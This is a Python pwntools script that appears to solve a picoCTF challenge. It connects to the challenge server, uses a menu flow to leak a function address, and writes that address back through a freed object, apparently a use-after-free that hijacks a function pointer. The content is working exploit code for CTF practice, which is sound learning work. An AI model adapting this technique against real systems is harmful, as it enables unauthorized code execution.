#!/usr/bin/env python3
from pwn import *
context.log_level = "debug"
#r = process("./vuln")
r = remote("mercury.picoctf.net", 58574)

def dropmenu():
    r.recvuntil("(e)xit")
def sub():
    dropmenu()
    r.sendline("S")
    r.recvuntil("OOP! Memory leak...")
    res = int(r.recvline().strip(), 16)
    r.recvline()
    return res
def inq():
    dropmenu()
    r.sendline("I")
    r.recvline()
    r.sendline("Y")
    r.recvline()
def make(msg):
    dropmenu()
    r.sendline("M")
    for i in range(3):
        r.recvline()
    r.sendline(msg)
    r.recvline()
def pay():
    dropmenu()
    r.sendline("P")
    r.recvline()
def leave_msg(msg):
    dropmenu()
    r.sendline("l")
    r.recvline()
    r.recvline()
    r.sendline(msg)
def exit():
    dropmenu()
    r.sendline("e")

leak = sub()
success("Found target function %s" % hex(leak))
input(">")
inq()
leave_msg(p64(leak))
exit()

print(r.recvall())
r.close()
